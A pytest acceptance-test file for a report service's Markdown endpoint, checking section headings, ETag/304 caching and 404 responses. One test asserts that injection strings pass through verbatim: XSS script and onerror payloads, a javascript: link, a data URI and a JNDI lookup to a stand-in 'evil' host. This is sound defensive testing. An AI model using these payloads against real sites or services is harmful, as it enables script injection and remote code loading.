"""P3-01 acceptance tests: GET /api/v1/reports/{id}/markdown (RPT-05, T9, T13).

The Markdown endpoint is a pure projection of the stored DTO: the ``# `` heading
sequence is exactly ``ordered_sections()``, the ETag is the quoted
``content_hash``, and a matching ``If-None-Match`` returns 304 with no body.
Raw HTML is emitted as stored; the reader is responsible for disabling it.
"""

from __future__ import annotations

import copy
import json
import sys
from datetime import datetime
from pathlib import Path
from types import SimpleNamespace

import pytest
from alembic import command
from alembic.config import Config
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from backend.app.core.config import JOBS_DB_ENV  # noqa: E402
from backend.app.core.db import build_engine  # noqa: E402
from backend.app.core.server_config import ServerConfig  # noqa: E402
from backend.app.main import create_app  # noqa: E402
from backend.app.models import Report  # noqa: E402
from backend.app.services.job_service import CST, JobService  # noqa: E402
from backend.app.services.report_render import ordered_sections  # noqa: E402
from backend.app.services.report_store import ReportStore  # noqa: E402

BACKEND = ROOT / "backend"
FIXTURES = ROOT / "tests" / "fixtures" / "upgrade"
CLOCK = datetime(2026, 10, 30, 9, 0, tzinfo=CST)
REPORT_ID = "55555555-4b5a-6978-8765-4321fedcba98"
SERVER_CONFIG = ServerConfig(write_mode="next")


def _fixture(name: str) -> dict:
    return json.loads((FIXTURES / f"{name}.json").read_text(encoding="utf-8"))


@pytest.fixture()
def env(tmp_path, monkeypatch):
    monkeypatch.setenv(JOBS_DB_ENV, str(tmp_path / "jobs" / "jobs.db"))
    monkeypatch.setenv("TA_JOB_REPORTS_DIR", str(tmp_path / "reports"))
    cfg = Config(str(BACKEND / "alembic.ini"))
    cfg.set_main_option("script_location", str(BACKEND / "alembic"))
    command.upgrade(cfg, "head")

    engine = build_engine()
    reports = ReportStore(tmp_path / "reports")
    service = JobService(engine, SERVER_CONFIG, clock=lambda: CLOCK, reports=reports)
    client = TestClient(
        create_app(service=service, server_config=SERVER_CONFIG, report_store=reports)
    )
    try:
        yield SimpleNamespace(engine=engine, client=client)
    finally:
        client.close()
        engine.dispose()


def _insert(env, name: str, report_id: str = REPORT_ID) -> dict:
    payload = _fixture(name)
    payload["meta"]["report_id"] = report_id
    payload["meta"]["job_id"] = None
    row = Report(
        report_id=report_id,
        job_id=None,
        ticker_code=payload["meta"]["ticker_code"],
        ticker_name=payload["meta"].get("ticker_name"),
        analysis_date=payload["meta"]["analysis_date"],
        generated_at=payload["meta"]["generated_at"],
        generated_at_source=payload["meta"]["generated_at_source"],
        origin=payload["meta"]["origin"],
        schema_version=payload["meta"]["schema_version"],
        content_hash=payload["meta"]["content_hash"],
        config_digest=payload["meta"].get("config_digest"),
        data_quality_status=payload["meta"]["data_quality_status"],
        chart_snapshot_status=payload["meta"]["chart_snapshot_status"],
        retry_of_job_id=None,
        rating=payload["meta"]["rating"],
        signal=payload["meta"]["signal"],
        payload=payload,
        created_at=(
            payload["meta"]["generated_at"]
            or CLOCK.isoformat(timespec="seconds")
        ),
    )
    with Session(env.engine) as session:
        session.add(row)
        session.commit()
    return copy.deepcopy(payload)


def _markdown(env, report_id: str = REPORT_ID) -> str:
    response = env.client.get(f"/api/v1/reports/{report_id}/markdown")
    assert response.status_code == 200, response.text
    assert response.headers["content-type"] == "text/markdown; charset=utf-8"
    return response.text


def _headings(text: str) -> list[str]:
    return [line for line in text.splitlines() if line.startswith("# ")]


def test_rpt05_markdown_order_etag_and_304(env):
    payload = _insert(env, "final_state_v1")
    expected = [f"# {section['title']}" for section in ordered_sections(payload)]

    text = _markdown(env)
    assert _headings(text) == expected
    assert len(expected) == 13

    response = env.client.get(f"/api/v1/reports/{REPORT_ID}/markdown")
    etag = response.headers["ETag"]
    assert etag == f'"{payload["meta"]["content_hash"]}"'

    cached = env.client.get(
        f"/api/v1/reports/{REPORT_ID}/markdown", headers={"If-None-Match": etag}
    )
    assert cached.status_code == 304
    assert cached.content == b""
    assert cached.headers["ETag"] == etag

    weak = env.client.get(
        f"/api/v1/reports/{REPORT_ID}/markdown", headers={"If-None-Match": f"W/{etag}"}
    )
    assert weak.status_code == 304

    stale = env.client.get(
        f"/api/v1/reports/{REPORT_ID}/markdown",
        headers={"If-None-Match": '"00000000000000000000000000000000"'},
    )
    assert stale.status_code == 200

    missing = env.client.get(
        "/api/v1/reports/00000000-0000-4000-8000-999999999999/markdown"
    )
    assert missing.status_code == 404
    assert missing.json()["error"]["code"] == "report_not_found"


def test_missing_sections_never_render_bare_headings(env):
    payload = _insert(env, "missing_fields_report")
    text = _markdown(env)
    assert _headings(text) == [
        "# 最终交易决策",
        "# 技术分析",
    ]
    assert "# 数据质量" not in text
    assert len(ordered_sections(payload)) == 2


def test_parts_and_cross_reference_render(env):
    _insert(env, "final_state_v1")
    text = _markdown(env)
    assert "**多方论点**" in text
    assert "**空方论点**" in text
    assert "**研究经理结论**" in text
    assert "**激进观点**" in text
    assert "见「最终交易决策」（内容相同）。" in text


def test_t13_unsafe_text_stays_inert_in_markdown(env):
    payload = _insert(env, "unsafe_text_report")
    text = _markdown(env)

    for token in (
        '<script>alert("xss")</script>',
        "<img src=x onerror=alert(1)>",
        "[伪装链接](javascript:alert(1))",
        "data:text/html;base64",
        "${jndi:ldap://evil/x}",
    ):
        assert token in text

    assert _headings(text) == [
        f"# {section['title']}" for section in ordered_sections(payload)
    ]
    assert text.count("<script>") == payload["sections"]["sec-news"]["body"].count(
        "<script>"
    )
